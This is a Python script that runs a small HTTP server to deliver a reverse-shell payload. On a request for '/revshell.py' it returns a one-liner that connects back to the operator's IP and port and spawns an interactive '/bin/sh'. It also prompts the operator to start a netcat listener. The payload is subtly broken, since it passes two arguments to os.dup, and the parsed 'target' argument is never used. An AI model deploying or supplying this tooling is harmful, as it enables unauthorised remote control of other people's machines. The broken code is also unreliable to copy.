import socket
import threading
import argparse

# Set up argument parsing with argparse
parser = argparse.ArgumentParser(description="Start a simple HTTP server to handle specific requests")
parser.add_argument("target", help="Target IP or domain")
parser.add_argument("local_ip", help="Local IP address to bind the server")
parser.add_argument("listener_port", type=int, help="Port to listen for reverse shell connections")
parser.add_argument("--http_port", type=int, default=80, help="Port to run the HTTP server on (default: 80)")

args = parser.parse_args()

target = args.target
local_ip = args.local_ip
listener_port = args.listener_port
http_port = args.http_port  # Now you can specify the HTTP port via the command line, with a default of 80

# Function to handle client requests
def handle_client(client_socket):
    request = client_socket.recv(1024).decode('utf-8')  # Receive request

    if '/revshell.py' in request:
        print(f'Sending the Python script to get reverse shell. Be sure you ran `nc -lnvp {listener_port}` before')
        response = f"""HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nimport time,socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{local_ip}",{listener_port}));os.dup(s.fileno(),0);os.dup(s.fileno(),1);os.dup(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);"""
        client_socket.send(response.encode('utf-8'))
    else:
        # Handle other requests or 404s
        response = "HTTP/1.1 404 Not Found\r\n\r\n"
        client_socket.send(response.encode('utf-8'))

    client_socket.close()  # Close the client connection

# Function to start the server
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((local_ip, http_port))
    server.listen(5)
    print(f"[*] Listening on {local_ip}:{http_port}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

# Run the server in a separate thread
threading.Thread(target=start_server).start()
